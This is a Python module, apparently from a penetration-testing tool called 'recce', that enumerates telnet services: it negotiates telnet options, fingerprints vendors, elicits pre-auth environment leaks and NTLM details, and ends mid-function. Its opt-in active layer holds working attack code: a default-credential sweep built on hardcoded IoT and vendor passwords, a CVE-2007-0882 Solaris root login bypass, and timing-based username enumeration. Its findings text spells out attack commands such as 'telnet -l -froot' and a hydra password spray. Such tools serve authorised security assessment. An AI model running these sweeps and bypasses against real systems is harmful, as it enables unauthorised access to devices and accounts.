"""Deep telnet enumeration (stdlib IAC negotiator).

Two layers:

  * Credential-free (airgapped, stdlib): a socket-level IAC negotiator reads
    the pre-auth WILL/DO/WONT/DONT stream, records which options the server
    offers, IAC-strips the interleaved banner/login prompt for vendor
    fingerprinting, and where NEW-ENVIRON (RFC 1572) is offered replies with
    IAC SB NEW-ENVIRON SEND VAR IAC SE to elicit leaked env vars.
  * Gated active layer (RECCE_ACTIVE_ATTACKS=1): a vendor-conditioned default-
    credential sweep and the Solaris in.telnetd -f authentication bypass
    (CVE-2007-0882) client-side probe.

Telnet has no encryption in the base protocol (RFC 854) and RFC 2946 ENCRYPT
is optional and almost never negotiated, so the mere presence of the service
is a high-severity finding on any 2020+ network.
"""
from __future__ import annotations

import os
import re
import socket
import ssl
import time

from ..core import proxy
from ..core.models import Host, Port
from .svccommon import finding_builder


_DEFAULT_PORT = 23
_TLS_PORT = 992
_ALT_PORTS = (2323, 5555)
_TIMEOUT = 5.0
_READ_WINDOW = 2.5      # bounded window for the pre-auth negotiation

# IAC command bytes (RFC 854).
IAC = 0xFF
DONT = 0xFE
DO = 0xFD
WONT = 0xFC
WILL = 0xFB
SB = 0xFA
GA = 0xF9
EL = 0xF8
EC = 0xF7
AYT = 0xF6
AO = 0xF5
IP_CMD = 0xF4
BREAK = 0xF3
DM = 0xF2
NOP = 0xF1
SE = 0xF0

# Options we care about.
OPT_BINARY = 0x00
OPT_ECHO = 0x01
OPT_SUPPRESS_GA = 0x03
OPT_STATUS = 0x05
OPT_TTYPE = 0x18
OPT_NAWS = 0x1F
OPT_LINEMODE = 0x22
OPT_ENVIRON = 0x24      # RFC 1408 (option 36) — VAR/VALUE codes originally reversed
OPT_AUTH = 0x25         # RFC 2941 (option 37)
OPT_ENCRYPT = 0x26      # RFC 2946 (option 38)
OPT_NEW_ENVIRON = 0x27  # RFC 1572 (option 39)

# NEW-ENVIRON sub-negotiation codes (RFC 1572 §2).
NEW_IS = 0
NEW_SEND = 1
NEW_INFO = 2
NEW_VAR = 0
NEW_VALUE = 1
NEW_ESC = 2
NEW_USERVAR = 3

_OPT_NAMES = {
    OPT_BINARY: "BINARY", OPT_ECHO: "ECHO", OPT_SUPPRESS_GA: "SUPPRESS-GA",
    OPT_STATUS: "STATUS", OPT_TTYPE: "TTYPE", OPT_NAWS: "NAWS",
    OPT_LINEMODE: "LINEMODE", OPT_ENVIRON: "ENVIRON", OPT_AUTH: "AUTHENTICATION",
    OPT_ENCRYPT: "ENCRYPT", OPT_NEW_ENVIRON: "NEW-ENVIRON",
}

# Environment variable names commonly leaked by NEW-ENVIRON SEND requests.
_ENVIRON_ASK = (b"USER", b"LOGNAME", b"DISPLAY", b"HOME", b"JOB",
                b"ACCT", b"PRINTER", b"SYSTEMTYPE", b"DOMAIN")


# Banner substring -> (severity, title, detail, cwes, kind, cmd). Deliberately
# narrow: only well-known, high-confidence backdoored / RCE builds.
_KNOWN_BAD = [
    (re.compile(r"SunOS 5\.10", re.I), (
        "critical", "Solaris in.telnetd -f authentication bypass (CVE-2007-0882)",
        "Banner advertises SunOS 5.10 whose in.telnetd passes a client-supplied "
        "username through to login(1) unchecked: connecting with USER=-froot "
        "yields a root shell with no password. Instant pre-auth RCE.",
        ["CWE-88", "CWE-287"], "telnet_known_backdoor",
        "telnet -l -froot <ip>")),
    (re.compile(r"netkit[- ]?telnetd|inetutils.*telnetd", re.I), (
        "critical", "netkit/inetutils telnetd encrypt_keyid overflow (CVE-2020-10188)",
        "Banner names netkit/inetutils telnetd, whose encrypt_keyid handler had a "
        "pre-auth heap overflow exploitable for remote code execution.",
        ["CWE-119", "CWE-787"], "telnet_known_backdoor",
        "public CVE-2020-10188 PoC")),
    (re.compile(r"BusyBox.*telnetd|\(none\) login:", re.I), (
        "high", "BusyBox telnetd — check for hardcoded credentials",
        "Banner/prompt matches a BusyBox telnetd, the daemon used by many "
        "embedded/IoT devices. Vendors (Dahua/Xiongmai/D-Link/TP-Link/Netgear) "
        "have repeatedly shipped these with hardcoded roots (root:xc3511, "
        "root:vizxv, etc.) — Mirai/Mozi harvested millions of hosts this way.",
        ["CWE-798"], "telnet_known_backdoor",
        "try root:xc3511, root:vizxv, root:root against the login prompt")),
]

# Vendor fingerprint from banner / login prompt. Ordered — first match wins.
_VENDOR_TABLE = [
    (re.compile(r"User Access Verification", re.I), "cisco-ios",
     "Cisco IOS (User Access Verification banner)"),
    (re.compile(r"SunOS 5\.\d+", re.I), "solaris",
     "Sun/Oracle Solaris (SunOS 5.x)"),
    (re.compile(r"HP-UX", re.I), "hp-ux", "HP-UX"),
    (re.compile(r"\biLO\b", re.I), "hp-ilo", "HP iLO management processor"),
    (re.compile(r"ONTAP|NetApp Release", re.I), "netapp-ontap", "NetApp ONTAP"),
    (re.compile(r"\(none\) login:", re.I), "busybox",
     "BusyBox / embedded Linux"),
    (re.compile(r"Ubuntu \d\d\.\d\d", re.I), "ubuntu", "Ubuntu Linux"),
    (re.compile(r"Debian GNU/Linux", re.I), "debian", "Debian GNU/Linux"),
    (re.compile(r"CentOS release|Red Hat", re.I), "rhel",
     "RHEL / CentOS Linux"),
    (re.compile(r"JUNOS|Juniper", re.I), "juniper", "Juniper Junos"),
    (re.compile(r"Welcome to Microsoft Telnet", re.I), "windows",
     "Microsoft Telnet Server (Windows)"),
    (re.compile(r"AIX Version", re.I), "aix", "IBM AIX"),
]

# Vendor-conditioned default credentials for the gated sweep. Every pair here
# is a well-documented factory default that appeared in vendor manuals and
# Mirai-class botnet cred lists.
_VENDOR_DEFAULTS = {
    "cisco-ios": [("cisco", "cisco"), ("admin", "admin"), ("admin", "")],
    "busybox":   [("root", "root"), ("root", ""), ("root", "xc3511"),
                  ("root", "vizxv"), ("root", "xmhdipc"), ("root", "hi3518"),
                  ("admin", "admin"), ("support", "support")],
    "hp-ilo":    [("Administrator", "admin"), ("admin", "admin")],
    "netapp-ontap": [("admin", "netapp1!"), ("admin", "admin")],
    "juniper":   [("root", ""), ("root", "juniper")],
    "solaris":   [("root", ""), ("root", "changeme")],
    "aix":       [("root", "ibm"), ("root", "")],
    "windows":   [("Administrator", "administrator"), ("admin", "admin")],
    "unknown":   [("root", "root"), ("admin", "admin"), ("admin", ""),
                  ("root", ""), ("ubnt", "ubnt")],
}


def is_telnet(port: Port) -> bool:
    if not port.is_open:
        return False
    if port.portid in (_DEFAULT_PORT, _TLS_PORT, *_ALT_PORTS):
        return True
    svc = f"{port.service} {port.product} {port.extrainfo}".lower()
    return "telnet" in svc


# --- IAC parser -----------------------------------------------------------------

def _iac_parse(buf: bytes) -> dict:
    """Walk an IAC stream. Returns:
      {text: bytes,              # IAC-stripped payload (banner + prompt)
       will: set[int], wont: set[int], do: set[int], dont: set[int],
       sb: dict[int, list[bytes]]}   # option -> list of subneg payloads
    Handles IAC IAC → literal 0xFF and buffers IAC SB … IAC SE."""
    text = bytearray()
    will: set[int] = set(); wont: set[int] = set()
    do: set[int] = set(); dont: set[int] = set()
    sb: dict[int, list[bytes]] = {}
    i = 0
    n = len(buf)
    while i < n:
        b = buf[i]
        if b != IAC:
            text.append(b)
            i += 1
            continue
        if i + 1 >= n:
            break
        cmd = buf[i + 1]
        if cmd == IAC:
            text.append(IAC)
            i += 2
            continue
        if cmd in (WILL, WONT, DO, DONT):
            if i + 2 >= n:
                break
            opt = buf[i + 2]
            {WILL: will, WONT: wont, DO: do, DONT: dont}[cmd].add(opt)
            i += 3
            continue
        if cmd == SB:
            if i + 2 >= n:
                break
            opt = buf[i + 2]
            j = i + 3
            body = bytearray()
            while j < n:
                if buf[j] == IAC and j + 1 < n:
                    if buf[j + 1] == IAC:
                        body.append(IAC)
                        j += 2
                        continue
                    if buf[j + 1] == SE:
                        j += 2
                        break
                    # any other IAC inside SB — treat as termination guard
                    j += 2
                    break
                body.append(buf[j])
                j += 1
            sb.setdefault(opt, []).append(bytes(body))
            i = j
            continue
        # single-byte IAC commands (AYT, NOP, GA, …)
        i += 2
    return {"text": bytes(text), "will": will, "wont": wont,
            "do": do, "dont": dont, "sb": sb}


def _environ_parse(body: bytes) -> dict[str, str]:
    """Parse a NEW-ENVIRON / ENVIRON sub-negotiation IS payload.

    Body layout (RFC 1572 §2): first byte is IS(0)/SEND(1)/INFO(2), then a
    sequence of (VAR|USERVAR name) (VALUE value) items. The RFC 1408 (old
    ENVIRON, option 36) codes VAR/VALUE were reversed in some BSD builds; we
    accept both readings (0/1 or 1/0 as name/value markers) and merge — the
    resulting dict is the union so a naive server can't hide the leak.
    """
    out: dict[str, str] = {}
    if not body:
        return out
    sub = body[0]
    if sub != NEW_IS and sub != NEW_INFO:
        return out
    payload = body[1:]

    def _walk(name_codes: tuple[int, ...], value_code: int) -> dict[str, str]:
        acc: dict[str, str] = {}
        name = None
        buf = bytearray()
        code = None
        i = 0
        while i < len(payload):
            c = payload[i]
            if c in name_codes or c == value_code:
                if code is not None:
                    _emit(acc, code, buf, name_codes, value_code, name)
                    if code in name_codes:
                        name = bytes(buf).decode("latin-1", "replace")
                buf = bytearray()
                code = c
                i += 1
                continue
            if c == NEW_ESC and i + 1 < len(payload):
                buf.append(payload[i + 1])
                i += 2
                continue
            buf.append(c)
            i += 1
        if code is not None:
            _emit(acc, code, buf, name_codes, value_code, name)
        return acc

    def _emit(acc, code, buf, name_codes, value_code, name):
        if code == value_code and name is not None:
            acc[name] = bytes(buf).decode("latin-1", "replace")

    # RFC 1572 canonical: VAR=0, USERVAR=3, VALUE=1
    out.update(_walk((NEW_VAR, NEW_USERVAR), NEW_VALUE))
    # RFC 1408 reversed (some BSD): VAR=1, VALUE=0
    out.update(_walk((1,), 0))
    return out


# --- vendor fingerprint ---------------------------------------------------------

def _vendor_from(text: str) -> tuple[str, str]:
    """(vendor_slug, description). ('unknown', '') if nothing matches."""
    for rx, slug, desc in _VENDOR_TABLE:
        if rx.search(text):
            return slug, desc
    return "unknown", ""


def _clean_banner(text: bytes) -> str:
    """IAC-stripped bytes → a short human-readable banner (nulls dropped,
    control chars kept as spaces, whitespace collapsed)."""
    s = text.decode("latin-1", "replace")
    s = s.replace("\x00", "")
    s = re.sub(r"[\x01-\x08\x0b-\x1f\x7f]", " ", s)
    s = re.sub(r"\s+", " ", s).strip()
    return s[:400]


# --- socket layer ---------------------------------------------------------------

def _read_negotiation(sock, deadline: float) -> bytes:
    """Read from the socket until it stalls or the deadline expires. Returns
    everything received."""
    buf = bytearray()
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        try:
            sock.settimeout(min(remaining, 0.6))
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        except OSError:
            break
        if not chunk:
            break
        buf.extend(chunk)
        if len(buf) > 65535:
            break
    return bytes(buf)


def _environ_send_request() -> bytes:
    """Assemble IAC WILL NEW-ENVIRON followed by an IAC SB NEW-ENVIRON SEND
    listing standard variable names, ended with IAC SE."""
    body = bytearray([NEW_SEND])
    for name in _ENVIRON_ASK:
        body.append(NEW_VAR)
        body.extend(name)
    for name in (b"LC_ALL", b"LC_CTYPE"):
        body.append(NEW_USERVAR)
        body.extend(name)
    return (bytes([IAC, WILL, OPT_NEW_ENVIRON])
            + bytes([IAC, SB, OPT_NEW_ENVIRON]) + bytes(body)
            + bytes([IAC, SE]))


def _default_replies(parsed: dict) -> bytes:
    """A conservative counter-offer keeping the server talking:
      * WONT everything the server DO'd (except NEW-ENVIRON, which we WILL
        so the SEND request is legal)
      * DONT everything the server WILL'd (we don't need any of it)"""
    out = bytearray()
    for opt in sorted(parsed["do"]):
        if opt == OPT_NEW_ENVIRON:
            continue
        out.extend([IAC, WONT, opt])
    for opt in sorted(parsed["will"]):
        out.extend([IAC, DONT, opt])
    return bytes(out)


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
          use_tls: bool = False) -> dict | None:
    """Connect, read the pre-auth IAC negotiation, ask for NEW-ENVIRON if
    offered, IAC-strip the banner and vendor-fingerprint it.

    Returns None if the port refused a connection or produced nothing that
    looked like telnet."""
    t = proxy.scaled(timeout)
    try:
        raw = socket.create_connection((ip, port), timeout=t)
    except OSError:
        return None
    sock: socket.socket
    try:
        if use_tls:
            try:
                ctx = ssl._create_unverified_context()
                ctx.check_hostname = False
                sock = ctx.wrap_socket(raw, server_hostname=ip)
            except (ssl.SSLError, OSError, ValueError):
                raw.close()
                return None
        else:
            sock = raw
        deadline = time.monotonic() + min(_READ_WINDOW, t)
        first = _read_negotiation(sock, deadline)
        parsed = _iac_parse(first)
        # Heuristic: a real telnet server almost always sends at least one IAC
        # in the first window. A raw TCP banner-only responder (Cisco console
        # concentrator, u-boot) will not, and we should not tag it as telnet.
        looks_like_telnet = bool(parsed["will"] or parsed["do"]
                                 or parsed["wont"] or parsed["dont"]
                                 or IAC in first)
        # Environ leak: reply asking for standard vars if NEW-ENVIRON was in
        # the DO/WILL stream. Then read a bit more.
        environ_leak: dict[str, str] = {}
        offered_environ = (OPT_NEW_ENVIRON in parsed["do"]
                           or OPT_NEW_ENVIRON in parsed["will"]
                           or OPT_ENVIRON in parsed["do"]
                           or OPT_ENVIRON in parsed["will"])
        try:
            if offered_environ:
                sock.sendall(_environ_send_request())
            else:
                # Send WONT for everything so the server sends its prompt
                sock.sendall(_default_replies(parsed))
        except OSError:
            pass
        deadline2 = time.monotonic() + 1.5
        second = _read_negotiation(sock, deadline2)
        combined = first + second
        parsed = _iac_parse(combined)
        for body in parsed["sb"].get(OPT_NEW_ENVIRON, []):
            environ_leak.update(_environ_parse(body))
        for body in parsed["sb"].get(OPT_ENVIRON, []):
            environ_leak.update(_environ_parse(body))

        # NTLM AV_PAIR harvest — the Windows Telnet AUTHENTICATION sub-option
        # wraps NTLMSSP; a Type-2 challenge blob starts with "NTLMSSP\x00".
        ntlm_info = {}
        for body in parsed["sb"].get(OPT_AUTH, []):
            idx = body.find(b"NTLMSSP\x00")
            if idx >= 0:
                ntlm_info = _parse_ntlm_type2(body[idx:]) or ntlm_info

        banner = _clean_banner(parsed["text"])
        vendor, vendor_desc = _vendor_from(banner)
        # AYT liveness — send IAC AYT and see if we get anything back. Confirms
        # the peer speaks telnet vs. a squatter banner on 23.
        ayt_ok = False
        try:
            sock.sendall(bytes([IAC, AYT]))
            sock.settimeout(1.0)
            resp = sock.recv(256)
            ayt_ok = bool(resp)
        except OSError:
            pass
    finally:
        try:
            sock.close()  # type: ignore[has-type]
        except Exception:  # noqa: BLE001
            try:
                raw.close()
            except OSError:
                pass

    if not (looks_like_telnet or banner):
        return None
    return {
        "ip": ip, "port": port, "banner": banner,
        "options_will": sorted(parsed["will"]),
        "options_do": sorted(parsed["do"]),
        "options_wont": sorted(parsed["wont"]),
        "options_dont": sorted(parsed["dont"]),
        "encrypt_offered": OPT_ENCRYPT in parsed["will"] or OPT_ENCRYPT in parsed["do"],
        "auth_offered": OPT_AUTH in parsed["will"] or OPT_AUTH in parsed["do"],
        "environ_offered": offered_environ,
        "environ_leak": environ_leak,
        "vendor": vendor, "vendor_desc": vendor_desc,
        "ntlm": ntlm_info, "ayt_ok": ayt_ok, "tls": bool(use_tls),
        "looks_like_telnet": looks_like_telnet,
    }


# --- NTLM Type-2 AV_PAIR parser -------------------------------------------------

# AvId values (MS-NLMP §2.2.2.1).
_AV_IDS = {
    0x0001: "nb_computer_name",
    0x0002: "nb_domain_name",
    0x0003: "dns_computer_name",
    0x0004: "dns_domain_name",
    0x0005: "dns_tree_name",
    0x0007: "timestamp",
}


def _parse_ntlm_type2(blob: bytes) -> dict:
    """Extract AV_PAIR fields from an NTLMSSP CHALLENGE_MESSAGE."""
    import struct as _struct
    if len(blob) < 48 or blob[:8] != b"NTLMSSP\x00":
        return {}
    try:
        msg_type = _struct.unpack_from("<I", blob, 8)[0]
        if msg_type != 2:
            return {}
        ti_len, _ti_max, ti_off = _struct.unpack_from("<HHI", blob, 40)
    except _struct.error:
        return {}
    if ti_off + ti_len > len(blob):
        return {}
    ti = blob[ti_off:ti_off + ti_len]
    out: dict = {}
    i = 0
    while i + 4 <= len(ti):
        av_id, av_len = _struct.unpack_from("<HH", ti, i)
        i += 4
        if av_id == 0:
            break
        if i + av_len > len(ti):
            break
        val = ti[i:i + av_len]
        name = _AV_IDS.get(av_id)
        if name:
            if name == "timestamp":
                out[name] = val.hex()
            else:
                out[name] = val.decode("utf-16-le", "replace")
        i += av_len
    return out


# --- gated attacks --------------------------------------------------------------

def _active_gate() -> bool:
    return os.environ.get("RECCE_ACTIVE_ATTACKS", "").lower() in ("1", "true", "yes")


def _read_until(sock, needle_rx: re.Pattern, deadline: float) -> bytes:
    """Read until `needle_rx` matches the IAC-stripped buffer or deadline."""
    raw = bytearray()
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        try:
            sock.settimeout(min(remaining, 1.0))
            chunk = sock.recv(4096)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        raw.extend(chunk)
        stripped = _iac_parse(bytes(raw))["text"]
        if needle_rx.search(stripped):
            break
    return bytes(raw)


_LOGIN_RX = re.compile(rb"(?i)(login|user(name)?)\s*:\s*$|\r?\nlogin:\s*$|\r?\n[Uu]sername:\s*$")
_PASS_RX = re.compile(rb"(?i)password\s*:\s*$")
_PROMPT_RX = re.compile(rb"([$#>]\s*$|[a-zA-Z0-9._-]+[#>]\s*$)")
_FAIL_RX = re.compile(rb"(?i)incorrect|failure|denied|invalid")


def try_login(ip: str, port: int, username: str, password: str,
              timeout: float = 6.0) -> dict:
    """Attempt one login. Returns
      {reachable, saw_login, saw_password, success, evidence, elapsed}"""
    out = {"reachable": False, "saw_login": False, "saw_password": False,
           "success": False, "evidence": "", "elapsed": 0.0}
    t = proxy.scaled(timeout)
    started = time.monotonic()
    try:
        s = socket.create_connection((ip, port), timeout=t)
    except OSError as e:
        out["evidence"] = f"connect failed: {e}"
        return out
    try:
        out["reachable"] = True
        # Answer any DO/WILL with WONT/DONT so we get to the prompt fast.
        first = _read_negotiation(s, time.monotonic() + 2.0)
        parsed = _iac_parse(first)
        try:
            s.sendall(_default_replies(parsed))
        except OSError:
            pass
        buf = _read_until(s, _LOGIN_RX, time.monotonic() + 3.0)
        if _LOGIN_RX.search(_iac_parse(buf)["text"]):
            out["saw_login"] = True
        try:
            s.sendall(username.encode("ascii", "replace") + b"\r\n")
        except OSError:
            pass
        buf2 = _read_until(s, _PASS_RX, time.monotonic() + 3.0)
        if _PASS_RX.search(_iac_parse(buf2)["text"]):
            out["saw_password"] = True
        try:
            s.sendall(password.encode("ascii", "replace") + b"\r\n")
        except OSError:
            pass
        buf3 = _read_until(s, _PROMPT_RX, time.monotonic() + 4.0)
        stripped3 = _iac_parse(buf3)["text"]
        if _FAIL_RX.search(stripped3):
            out["success"] = False
        elif _PROMPT_RX.search(stripped3):
            out["success"] = True
        out["evidence"] = _clean_banner(buf + buf2 + buf3)
    finally:
        out["elapsed"] = time.monotonic() - started
        try:
            s.close()
        except OSError:
            pass
    return out


def default_cred_sweep(ip: str, port: int, vendor: str,
                       timeout: float = 6.0,
                       active_attacks: bool | None = None) -> list[dict]:
    """Try the small vendor-conditioned default-cred list. Gated by
    RECCE_ACTIVE_ATTACKS=1 unless `active_attacks=True` is passed explicitly."""
    if active_attacks is not True and not _active_gate():
        return []
    creds = _VENDOR_DEFAULTS.get(vendor) or _VENDOR_DEFAULTS["unknown"]
    hits: list[dict] = []
    for user, pwd in creds:
        r = try_login(ip, port, user, pwd, timeout=timeout)
        if r["success"]:
            hits.append({"user": user, "password": pwd,
                         "evidence": r["evidence"], "elapsed": r["elapsed"]})
        # Small pacing pause so we do not lock accounts on a real device.
        time.sleep(0.2)
    return hits


def solaris_dashf_bypass(ip: str, port: int = _DEFAULT_PORT,
                         username: str = "root",
                         timeout: float = 6.0,
                         active_attacks: bool | None = None) -> dict:
    """Attempt CVE-2007-0882 by sending USER=-f<name>. Returns the login
    result dict (success=True means the -f authentication bypass fired)."""
    if active_attacks is not True and not _active_gate():
        return {"success": False, "gated": True, "evidence": "",
                "reachable": False}
    r = try_login(ip, port, f"-f{username}", "", timeout=timeout)
    r["gated"] = False
    return r


def timing_user_enum(ip: str, port: int, candidates: list[str],
                     baseline_users: list[str] | None = None,
                     timeout: float = 6.0) -> list[dict]:
    """Wall-clock timing of the password-prompt response for candidate vs
    baseline (obviously-invalid) usernames. Returns
      [{user, elapsed, baseline_avg, valid}]. `valid` is best-effort: True
    when the candidate's elapsed exceeds baseline_avg by >= 30%.
    """
    if not candidates:
        return []
    if not baseline_users:
        baseline_users = ["zz_nope_" + str(int(time.time() * 1e6) % 1000000),
                          "recce_baseline_x1", "recce_baseline_x2"]
    baselines: list[float] = []
    for u in baseline_users:
        r = try_login(ip, port, u, "invalid_" + u, timeout=timeout)
        if r["reachable"]:
            baselines.append(r["elapsed"])
    if not baselines:
        return []
    baseline_avg = sum(baselines) / len(baselines)
    out: list[dict] = []
    for u in candidates:
        r = try_login(ip, port, u, "invalid_recce_probe", timeout=timeout)
        out.append({
            "user": u, "elapsed": r["elapsed"],
            "baseline_avg": baseline_avg,
            "valid": r["reachable"] and r["elapsed"] >= baseline_avg * 1.3,
        })
    return out


# --- targets --------------------------------------------------------------------

def telnet_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if not is_telnet(p):
                continue
            out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                        "product": p.product or "", "version": p.version or "",
                        "tls": p.portid == _TLS_PORT})
    return out


# --- narratives + findings ------------------------------------------------------

_NARRATIVE = {
    "telnet_present": (
        "Telnet transports every keystroke, credential and command in cleartext. "
        "Anyone on-path (a SPAN port, an ARP-spoofed segment, a compromised "
        "switch) captures the login the first time an operator uses it. In "
        "2020+ its mere presence is a control failure — SSH replaces it "
        "everywhere it appears."),
    "telnet_no_encrypt": (
        "The server never advertised the RFC 2946 ENCRYPT option in its IAC "
        "negotiation, so even a client that asked for it would fall back to "
        "cleartext. The channel cannot be made private without replacing the "
        "protocol."),
    "telnet_iac_fingerprint": (
        "The set of options the server WILL/DO in its opening negotiation is a "
        "vendor/OS fingerprint independent of the banner text — it lets recce "
        "distinguish a Cisco IOS from a BusyBox from a Solaris telnetd even "
        "when the greeting is customised."),
    "telnet_environ_leak": (
        "NEW-ENVIRON (RFC 1572) let recce elicit environment variables (USER, "
        "LOGNAME, DISPLAY, HOME, …) from the server BEFORE any authentication. "
        "Leaked usernames feed known_users; leaked DISPLAY/HOME confirms which "
        "account owns the daemon."),
    "telnet_vendor_fingerprint": (
        "The pre-login banner / prompt style names the vendor and OS — every "
        "vendor guess opens a different runbook (Cisco 'show running-config', "
        "Solaris in.telnetd -f bypass, BusyBox hardcoded creds)."),
    "telnet_known_backdoor": (
        "This telnetd build is known to be backdoored or to expose a pre-auth "
        "RCE. Treat the host as fully compromisable — verify with the "
        "referenced module in ROE, then rotate every credential the host "
        "held or brokered."),
    "telnet_solaris_dashf_rce": (
        "Solaris 10 in.telnetd forwards a client-supplied USER value straight "
        "to login(1); a leading '-f' becomes the -f flag which skips password "
        "auth. `telnet -l -froot <ip>` opens a root shell."),
    "telnet_default_creds": (
        "The server accepted a vendor default / known-hardcoded credential — "
        "instant credentialed shell, and (embedded devices share creds "
        "ruthlessly) the same pair is worth spraying against every other "
        "service on the host and the rest of the segment."),
    "telnet_credentialed_shell": (
        "recce authenticated and captured host identity — hostname, OS, "
        "user list — for known_hostnames/known_users/known_domains."),
    "telnet_user_enum_timing": (
        "Wall-clock timing of the password prompt distinguishes existing from "
        "missing usernames — a low-noise pre-auth user enumeration that feeds "
        "known_users and focuses subsequent cred sprays."),
    "telnet_ntlm_info_leak": (
        "The Windows Telnet AUTHENTICATION exchange returned an NTLMSSP "
        "CHALLENGE_MESSAGE whose AV_PAIR fields disclose the NetBIOS / DNS "
        "computer name, domain, and forest — pre-auth information disclosure "
        "identical in shape to SMB NTLM_INFO."),
    "telnet_over_tls": (
        "Telnet-over-TLS (telnets, IANA port 992) — IAC negotiation completes "
        "inside a TLS tunnel. Rare, but still occasionally seen on legacy "
        "printers/Cisco boxes."),
    "telnet_sniff_runbook": (
        "Any capture of the segment — tcpdump 'tcp port 23' — yields every "
        "USER, PASS and keystroke in cleartext. This is the 'anyone on-path "
        "already has these creds' finding that motivates the segmentation "
        "writeup."),
    "telnet_ayt_liveness": (
        "IAC AYT (Are You There, byte 246) elicited a response — confirms the "
        "peer really speaks telnet and disambiguates a raw-banner squatter on "
        "23 (Cisco console concentrator, U-Boot serial-over-tcp)."),
}


_finding = finding_builder("telnet", _NARRATIVE)


TESTING_NARRATIVE = [
    ("1. Credential-free IAC probe (stdlib)",
     "recce reads the pre-auth IAC WILL/DO stream, IAC-strips the banner + "
     "prompt for vendor/OS fingerprinting, records whether ENCRYPT (RFC 2946) "
     "and AUTHENTICATION (RFC 2941) are offered, and where NEW-ENVIRON (RFC "
     "1572) is offered replies with a SEND VAR to elicit leaked env vars."),
    ("2. Vulnerability identification",
     "Presence alone is a HIGH cleartext finding. A NEW-ENVIRON leak, a "
     "known-backdoored build (Solaris in.telnetd -f, netkit telnetd overflow, "
     "BusyBox hardcoded creds), or an NTLM AV_PAIR disclosure each adds its "
     "own writeup."),
    ("3. Gated active layer (RECCE_ACTIVE_ATTACKS=1)",
     "A vendor-conditioned default-credential sweep and the Solaris "
     "CVE-2007-0882 -f bypass primitive; both refuse to run without the "
     "opt-in so a normal scan never risks lockouts or a live shell."),
    ("4. Runbook",
     "tcpdump 'tcp port 23' for on-path capture; the vendor-specific "
     "identity commands (`show version` for Cisco, `uname -a` for *nix) for "
     "post-auth harvest."),
]


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_telnet(p):
                continue
            tgt = f"{h.ip}:{p.portid}"
            pr = probes.get((h.ip, p.portid)) or {}
            banner = pr.get("banner") or f"{p.product} {p.version}".strip()

            # 1) presence-is-the-finding — always fires for open telnet.
            out.append(_finding(
                "high", "Telnet service exposed (cleartext by design)", tgt,
                f"Telnet on {tgt}. Base protocol (RFC 854) has no encryption "
                "and RFC 2946 ENCRYPT is optional and almost never negotiated, "
                "so USER/PASS and every keystroke cross the wire in clear.",
                "tcpdump", f"tcpdump -i <iface> -A 'tcp port {p.portid} and host "
                f"{h.ip}'",
                "Disable telnetd; require SSH with key auth. Remove the "
                "telnet client from operator paths so muscle-memory does not "
                "recreate the exposure.", ["CWE-319", "CWE-311"],
                kind="telnet_present",
                exploit_note=(
                    "tcpdump -i <iface> -A 's tcp port 23 and host IP' on the "
                    "segment; any operator login leaks creds."),
                depth_tier="t0"))

            if not pr:
                continue

            # 2) IAC fingerprint (always emitted alongside a real probe)
            opts_will = ", ".join(_OPT_NAMES.get(o, str(o))
                                  for o in pr.get("options_will") or []) or "(none)"
            opts_do = ", ".join(_OPT_NAMES.get(o, str(o))
                                for o in pr.get("options_do") or []) or "(none)"
            out.append(_finding(
                "info",
                f"Telnet IAC fingerprint (vendor guess: {pr.get('vendor','unknown')})",
                tgt,
                f"IAC WILL: {opts_will}\nIAC DO: {opts_do}\nBanner: "
                f"{banner[:200] or '(silent)'}",
                "telnet", f"telnet {h.ip} {p.portid}",
                "N/A — informational fingerprint used by other findings.",
                ["CWE-200"], kind="telnet_iac_fingerprint",
                exploit_note=(
                    "telnet IP 23 ; observe IAC options; use for "
                    "vendor-specific follow-up."),
                depth_tier="t0"))

            # 3) ENCRYPT absent (confirmed by direct observation)
            if pr.get("looks_like_telnet") and not pr.get("encrypt_offered"):
                auth_note = (" AUTHENTICATION (RFC 2941) also not offered."
                             if not pr.get("auth_offered")
                             else " AUTHENTICATION (RFC 2941) IS offered — an "
                             "unencrypted-but-authenticated login is still a "
                             "Kerberos password oracle.")
                out.append(_finding(
                    "medium",
                    "Telnet ENCRYPT option (RFC 2946) not offered", tgt,
                    "The server never advertised WILL/DO ENCRYPT during IAC "
                    "negotiation, so the channel cannot be encrypted even by "
                    "a client that asked for it." + auth_note,
                    "wireshark / tcpdump",
                    f"tcpdump -i <iface> -A 'tcp port {p.portid} and host "
                    f"{h.ip}'",
                    "Replace telnet with SSH; if the appliance vendor supports "
                    "it, enable RFC 2946 ENCRYPT and require a client that "
                    "negotiates it.", ["CWE-319", "CWE-311"],
                    kind="telnet_no_encrypt",
                    exploit_note=(
                        "wireshark on segment during login -- every keystroke "
                        "visible in clear."),
                    depth_tier="t0"))

            # 4) ENVIRON leak
            leak = pr.get("environ_leak") or {}
            if leak:
                users = ", ".join(f"{k}={v}" for k, v in leak.items())
                out.append(_finding(
                    "high",
                    "Telnet NEW-ENVIRON leaks env vars pre-auth (RFC 1572)",
                    tgt,
                    "Server responded to an IAC SB NEW-ENVIRON SEND VAR with "
                    f"an IS payload before authentication: {users}",
                    "telnet",
                    "python3 -c 'import telnetlib; "
                    f"t=telnetlib.Telnet(\"{h.ip}\",{p.portid}); "
                    "print(t.read_until(b\"login\",2))'",
                    "Disable the NEW-ENVIRON option on the telnetd (or remove "
                    "telnet entirely); at minimum blank USER/HOME/DISPLAY from "
                    "the server-side environment login sees.",
                    ["CWE-200", "CWE-201"], kind="telnet_environ_leak",
                    exploit_note=(
                        "hydra -L leaked_users.txt -P rockyou.txt telnet://IP:23 "
                        "-t 4 -f -w 5 ; also try ssh://IP with same list."),
                    depth_tier="t2"))

            # 5) vendor fingerprint (when we have a concrete guess)
            if pr.get("vendor") and pr["vendor"] != "unknown":
                out.append(_finding(
                    "high",
                    f"Telnet vendor/OS fingerprint: {pr.get('vendor_desc') or pr['vendor']}",
                    tgt,
                    f"Banner/prompt style identifies vendor '{pr['vendor']}': "
